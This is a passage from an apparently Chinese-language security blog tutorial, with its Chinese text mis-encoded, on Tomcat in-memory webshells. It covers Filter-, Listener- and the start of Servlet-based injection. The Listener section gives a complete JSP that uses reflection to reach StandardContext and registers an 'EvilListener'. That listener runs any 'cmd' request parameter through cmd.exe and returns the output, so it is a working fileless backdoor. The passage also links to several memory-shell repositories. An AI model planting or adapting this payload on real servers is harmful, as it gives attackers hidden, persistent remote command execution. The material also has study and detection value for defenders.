ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">filterConfigs.put(filterName, applicationFilterConfig);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯å®šä¹‰æˆ‘ä»¬è‡ªå·±çš„filterDefå’ŒFilterMapå¹¶åŠ å…¥åˆ°srandardContextä¸­ï¼Œæ¥ç€åå°„è·å– ApplicationFilterConfig ç±»çš„æ„é€ å‡½æ•°å¹¶å°†æ„é€ å‡½æ•°è®¾ç½®ä¸ºå¯è®¿é—®ï¼Œç„¶ååˆ›å»ºäº†ä¸€ä¸ª ApplicationFilterConfig å¯¹è±¡çš„å®ä¾‹ï¼Œæ¥ç€å°†åˆšåˆšåˆ›å»ºçš„å®ä¾‹æ·»åŠ åˆ°è¿‡æ»¤å™¨é…ç½®çš„ Map ä¸­ï¼ŒfilterName ä¸ºé”®ï¼Œè¿™æ ·å°±å¯ä»¥å°†åŠ¨æ€åˆ›å»ºçš„è¿‡æ»¤å™¨é…ç½®ä¿¡æ¯åŠ å…¥åº”ç”¨ç¨‹åºçš„å…¨å±€é…ç½®ä¸­ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨tomcat 7åŠä»¥å‰FilterDefå’ŒFilterMapè¿™ä¸¤ä¸ªç±»æ‰€å±çš„åŒ…åæ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>tomcat 8åŠä»¥åï¼ŒåŒ…åæ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>ç”±äºè¿™æ–¹é¢çš„åŒºåˆ«ï¼Œæœ€å¥½æ˜¯ç›´æ¥éƒ½ç”¨åå°„å»å†™è¿™ä¸ªfilterå†…å­˜é©¬ï¼Œå…·ä½“demoå‚è€ƒï¼š</p><p><a href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java">https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java</a></p><p>è¿˜æœ‰ä¸ªéœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯ï¼Œæˆ‘ç»™å‡ºçš„è¿™ä¸ªdemoä»£ç åªé€‚ç”¨äºtomcat 7åŠä»¥ä¸Šï¼Œå› ä¸º filterMap.setDispatcher(DispatcherType.REQUEST.name());è¿™è¡Œä»£ç ä¸­ç”¨åˆ°çš„DispatcherTypeæ˜¯åœ¨Servlet 3.0è§„èŒƒä¸­æ‰æœ‰çš„ã€‚</p><p>é€šç”¨å†…å­˜é©¬æ–‡ç« å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p><p><a href="https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ">https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ</a></p><p><a href="https://www.cnblogs.com/CoLo/p/16840371.html">https://www.cnblogs.com/CoLo/p/16840371.html</a></p><p><a href="https://flowerwind.github.io/2021/10/11/tomcat6">https://flowerwind.github.io/2021/10/11/tomcat6</a>ã€7ã€8ã€9å†…å­˜é©¬&#x2F;</p><p><a href="https://9bie.org/index.php/archives/960/">https://9bie.org/index.php/archives/960/</a></p><p><a href="https://github.com/xiaopan233/GenerateNoHard">https://github.com/xiaopan233/GenerateNoHard</a></p><p><a href="https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell">https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell</a></p><h3 id="2-2Listener-å†…å­˜é©¬"><a href="#2-2Listener-å†…å­˜é©¬" class="headerlink" title="2.2Listener å†…å­˜é©¬"></a>2.2Listener å†…å­˜é©¬</h3><h4 id="2-2-1-ä»€ä¹ˆæ˜¯-Listenerï¼Ÿ"><a href="#2-2-1-ä»€ä¹ˆæ˜¯-Listenerï¼Ÿ" class="headerlink" title="2.2.1 ä»€ä¹ˆæ˜¯ Listenerï¼Ÿ"></a>2.2.1 ä»€ä¹ˆæ˜¯ Listenerï¼Ÿ</h4><p>Listener æ˜¯ Java Servlet è§„èŒƒä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒæä¾›äº†ä¸€ç§æœºåˆ¶ï¼Œä½¿å¼€å‘è€…èƒ½å¤Ÿç¼–å†™ç›‘å¬å™¨ç±»æ¥ç›‘å¬å®¹å™¨äº‹ä»¶ï¼Œå¹¶åœ¨äº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œç›¸åº”çš„é€»è¾‘ã€‚è¿™æ ·çš„æœºåˆ¶ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹æºä»£ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ç›‘å¬å™¨å¯¹ç°æœ‰åº”ç”¨ç¨‹åºè¿›è¡Œæ‰©å±•æˆ–å¢å¼ºã€‚</p><h4 id="2-2-2-Listener-ç±»å‹"><a href="#2-2-2-Listener-ç±»å‹" class="headerlink" title="2.2.2 Listener ç±»å‹"></a>2.2.2 Listener ç±»å‹</h4><p>Java æä¾›äº†å‡ ç§ç±»å‹çš„ Listenerï¼Œå…¶ä¸­æœ€å¸¸è§çš„æœ‰ä»¥ä¸‹ä¸‰ç§ï¼š</p><ul><li><strong>ServletContextListenerï¼ˆä¸Šä¸‹æ–‡ç›‘å¬å™¨ï¼‰</strong>ï¼šç”¨äºç›‘å¬ Web åº”ç”¨ç¨‹åºçš„å¯åŠ¨å’Œå…³é—­äº‹ä»¶ã€‚</li><li><strong>HttpSessionListenerï¼ˆä¼šè¯ç›‘å¬å™¨ï¼‰</strong>ï¼šç”¨äºç›‘å¬ä¼šè¯çš„åˆ›å»ºå’Œé”€æ¯äº‹ä»¶ã€‚</li><li><strong>ServletRequestListenerï¼ˆè¯·æ±‚ç›‘å¬å™¨ï¼‰</strong>ï¼šç”¨äºç›‘å¬è¯·æ±‚çš„åˆ›å»ºå’Œé”€æ¯äº‹ä»¶ã€‚</li></ul><h4 id="2-2-3ç¼–å†™ä¸€ä¸ªdemoæ¥å­¦ä¹ "><a href="#2-2-3ç¼–å†™ä¸€ä¸ªdemoæ¥å­¦ä¹ " class="headerlink" title="2.2.3ç¼–å†™ä¸€ä¸ªdemoæ¥å­¦ä¹ "></a>2.2.3ç¼–å†™ä¸€ä¸ªdemoæ¥å­¦ä¹ </h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">listenerdemo</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestDestroyed(sre);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;chufa  listener !!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>web.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--listener æ³¨å†Œ--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.tomcat_demo_neicunma.filterdemo<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨èµ·æ¥ä¼šè§¦å‘ï¼Œæ¯ä¸€æ¬¡è¯·æ±‚éƒ½ä¼šè§¦å‘</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104151402-8fb5e5f2-cadc-4b70-9801-51b1c1b8d87e.png"></p><h4 id="2-2-4è°ƒè¯•åˆ†æ"><a href="#2-2-4è°ƒè¯•åˆ†æ" class="headerlink" title="2.2.4è°ƒè¯•åˆ†æ"></a>2.2.4è°ƒè¯•åˆ†æ</h4><p>è¿˜æ˜¯åƒå‰é¢åˆ†æçš„ä¸€æ ·ï¼Œçœ‹listeneræ˜¯å¦‚ä½•è°ƒç”¨æ‰§è¡Œçš„</p><p>è¿™é‡Œå‚è€ƒåœ¨è°ƒç”¨åˆ°listenerstartæ–¹æ³•ä¹‹å‰çš„è·Ÿè¸ªå’Œè°ƒç”¨</p><p><a href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716105178459-4f416b76-0e6e-49d6-903b-669fef4817d0.png"></p><p>åœ¨ContexConfigè¿™ä¸ªç±»çš„configureContextæ–¹æ³•é‡Œçš„addApplicationListeneråŠ è½½äº†web.xmlæ–‡ä»¶ä¸­çš„listeneré…ç½®è¯»å–å®Œé…ç½®æ–‡ä»¶ä¹‹åstandarcontextå›å»è°ƒç”¨listenerStartæ–¹æ³•</p><p>å¼€å§‹æ‰“ä¸‹æ–­ç‚¹ç„¶åè¿›è¡Œè°ƒè¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104469192-8054c239-d1d1-4c38-8b72-7efe4ff910db.png"></p><p>æˆ‘ä»¬ç›´æ¥æ‰¾åˆ°listenerStartæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109108992-fdb1afc5-8bad-4a14-86a4-ac60415792b7.png"></p><p>å¯ä»¥çœ‹åˆ°è¯¥æ–¹æ³•çš„ç¬¬ä¸€è¡Œæ„æ€å…¶å®å°±æ˜¯è·å–å·²ç»åŠ è½½çš„listenerä¹Ÿå°±web.xmlä¸­é…ç½®çš„ç›‘å¬å™¨ï¼Œæ¥ç€å¾€ä¸‹çœ‹ä»–å¯¹ç›‘å¬å™¨åšäº†ä¸€äº›åˆ†ç±»æœ‰äº‹ä»¶ç›‘å¬å™¨å’Œå£°æ˜å‘¨æœŸç›‘å¬å™¨ç­‰ã€‚ç´§æ¥ç€æˆ‘ä»¬çœ‹ä¸‹é¢ä¸€æ®µä»£ç </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109216065-90a643e9-d000-4e47-9013-db18dc7671b8.png"></p><p>çº¢æ¡†ä¸­åœˆå‡ºæ¥çš„è¿™æ®µä»£ç å°±æ˜¯åœ¨éå†getApplicationEventListeners()è·å–applicationEventListenersListä¸­çš„å€¼ï¼Œç„¶åå†è®¾ç½®applicationEventListenersListï¼Œå¯ä»¥ç†è§£ä¸ºapplicationEventListenersListåŠ ä¸Šåˆšåˆšå®ä¾‹åŒ–çš„eventListeners:<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109329399-55c17b08-0fed-4c30-abc3-c702ae669db6.png"></p><p>è¿™æ˜¯getApplicationEventListenersæ–¹æ³•çš„å†…å®¹å°±æ˜¯å°†applicationEventsListenerè½¬æ¢æˆåŒ…å«ä»»æ„ç±»å‹çš„å¯¹è±¡æ•°ç»„ã€‚é‚£è¿™æ€»ç»“èµ·æ¥å°±ä¸€å¥è¯ï¼Œå°±æ˜¯Listeneræœ‰ä¸¤ä¸ªæ¥æºï¼Œä¸€æ˜¯æ ¹æ®web.xmlæ–‡ä»¶æˆ–è€…@WebListeneræ³¨è§£å®ä¾‹åŒ–å¾—åˆ°çš„Listenerï¼›äºŒæ˜¯applicationEventListenersListä¸­çš„Listenerã€‚å‰é¢çš„æˆ‘ä»¬è‚¯å®šæ²¡æ³•æ§åˆ¶ï¼Œå› ä¸ºè¿™æ˜¯ç»™å¼€å‘è€…ç”¨çš„ï¼Œä¸æ˜¯ç»™é»‘å®¢ç”¨çš„å“ˆå“ˆå“ˆã€‚é‚£å°±æ‰¾æ‰¾çœ‹ï¼Œæœ‰æ²¡æœ‰ç±»ä¼¼ä¹‹å‰æˆ‘ä»¬ç”¨åˆ°çš„addFilterConfigè¿™ç§å‡½æ•°å‘¢ï¼Ÿå½“ç„¶æ˜¯æœ‰çš„ï¼Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109567639-27d5f88f-83a7-40d5-a775-f4addcd1d8df.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æœ‰çš„ã€‚æ‰€ä»¥å°±å¯ä»¥é€šè¿‡è·å–standardcontextå¯¹è±¡æ·»åŠ æˆ‘ä»¬è‡ªå®šä¹‰çš„ç›‘å¬å™¨</p><p>æˆ‘ä»¬ç»§ç»­å‘åè·Ÿåœ¨è°ƒç”¨åˆ°æˆ‘ä»¬è‡ªå·±çš„ç›‘å¬å™¨æ—¶å‘ç°æ˜¯ç”±<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109893759-55866782-6b6c-4ed2-8fc2-fba462e12ab7.png">fireRequestinitEventæ–¹æ³•è§¦å‘çš„è·Ÿè¿›è¿™ä¸ªæ–¹æ³•çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109992407-ffa0c485-24f8-40c7-acef-846ab4a6415f.png"></p><p>å‘ç°å…¶ä¼šè°ƒç”¨getApplicationEventListeners()å¹¶è°ƒç”¨å…¶ä¸­æ‰€æœ‰çš„ServletRequestListener.requestInitialized()</p><p>æ¥æ€»ç»“ä¸€ä¸‹ï¼š</p><p>Listeneræ¥æºäºtomcatåˆå§‹åŒ–æ—¶ä»web.xmlå®ä¾‹åŒ–çš„Listenerå’ŒapplicationEventListenersListä¸­çš„Listenerï¼Œå‰è€…æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œä½†æ˜¯åè€…æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œåªéœ€è¦å¾€applicationEventListenersListä¸­åŠ å…¥æˆ‘ä»¬çš„æ¶æ„Listenerå³å¯ã€‚å®é™…ä¸ŠStandardContextå­˜åœ¨addApplicationEventListener()æ–¹æ³•å¯ä»¥ç›´æ¥ç»™æˆ‘ä»¬è°ƒç”¨ï¼Œå¾€applicationEventListenersListä¸­åŠ å…¥Listenerã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„Listenerå†…å­˜é©¬å®ç°æ­¥éª¤:</p><ul><li><p>ç»§æ‰¿å¹¶ç¼–å†™ä¸€ä¸ªæ¶æ„Listener</p></li><li><p>è·å–StandardContext</p></li><li><p>è°ƒç”¨StandardContext.addApplicationEventListener()æ·»åŠ æ¶æ„Listener</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    context.addApplicationEventListener(evilListener);</span><br><span class="line">    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å…³é”®ä»£ç åˆ†æ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"><span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">context.addApplicationEventListener(evilListener);</span><br></pre></td></tr></table></figure><p>å‰é¢å››è¡Œä»£ç å¹²ä¸€ä»¶äº‹ï¼šè·å–StandardContextï¼›åä¸¤è¡Œå¹²ä»£ç å¹²è¿™ä¸¤ä»¶äº‹ï¼šå®ä¾‹åŒ–æˆ‘ä»¬ç¼–å†™çš„æ¶æ„Listenerï¼Œè°ƒç”¨addApplicationEventListeneræ–¹æ³•åŠ å…¥åˆ°applicationEventListenersListä¸­å»ï¼Œè¿™æ ·æœ€ç»ˆå°±ä¼šåˆ°eventListenerã€‚</p><p>å‚è€ƒï¼š<a href="http://wjlshare.com/archives/1651">http://wjlshare.com/archives/1651</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/</a></p><p><a href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99</a></p><h3 id="2-3servletå†…å­˜é©¬"><a href="#2-3servletå†…å­˜é©¬" class="headerlink" title="2.3servletå†…å­˜é©¬"></a>2.3servletå†…å­˜é©¬</h3><h4 id="2-3-1ä»€ä¹ˆæ˜¯servlet"><a href="#2-3-1ä»€ä¹ˆæ˜¯servlet" class="headerlink" title="2.3.1ä»€ä¹ˆæ˜¯servlet"></a>2.3.1ä»€ä¹ˆæ˜¯servlet</h4><p>å…ˆæ¢³ç†ä¸‹servletçš„æ¦‚å¿µå§ï¼Œåœ¨å‰ç½®åŸºç¡€ä¸­ä¹Ÿæœ‰ä»‹ç»åˆ°ï¼Œè¿™é‡Œå°±ç®€å•å™è¿°ä¸€ä¸‹</p><p>Java Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚</p><p>ä½¿ç”¨ Servletï¼Œæ‚¨å¯ä»¥æ”¶é›†æ¥è‡ªç½‘é¡µè¡¨å•çš„ç”¨æˆ·è¾“å…¥ï¼Œå‘ˆç°æ¥è‡ªæ•°æ®åº“æˆ–è€…å…¶ä»–æºçš„è®°å½•ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºç½‘é¡µã€‚</p><p>Java Servlet é€šå¸¸æƒ…å†µä¸‹ä¸ä½¿ç”¨ CGIï¼ˆCommon Gateway Interfaceï¼Œå…¬å…±ç½‘å…³æ¥å£ï¼‰å®ç°çš„ç¨‹åºå¯ä»¥è¾¾åˆ°å¼‚æ›²åŒå·¥çš„æ•ˆæœï¼Œæ¥æµ…çœ‹ä¸€ä¸‹Servletçš„æ¶æ„å›¾ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716302501974-ad72f07b-6755-48dd-9752-110cf116345f.png"></p><h4 id="2-3-2ç¼–å†™ä¸€ä¸ªdemo"><a href="#2-3-2ç¼–å†™ä¸€ä¸ªdemo" class="headerlink" title="2.3.2ç¼–å†™ä¸€ä¸ªdemo"></a>2.3.2ç¼–å†™ä¸€ä¸ªdemo</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(name = &quot;testservlet&quot;, value = &quot;/testdemo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servletdemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hello</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + <span class="string">&quot;hello world&quot;</span> + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xmlé…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--servlet æ³¨å†Œ--&gt;</span><br><span class="line"> &lt;servlet&gt;</span><br><span class="line">     &lt;servlet-name&gt;testdemo&lt;/servlet-name&gt;</span><br><span class="line">     &lt;servlet-class&gt;com.example.tomcat_demo_neicunma.servletdemo&lt;/servlet-class&gt;</span><br><span class="line"> &lt;/servlet&gt;</span><br><span class="line"> &lt;servlet-mapping&gt;</span><br><span class="line">     &lt;servlet-name&gt;testdemo&lt;/servlet-name&gt;</span><br><span class="line">     &lt;url-pattern&gt;/testdemo&lt;/url-pattern&gt;</span><br><span class="line"> 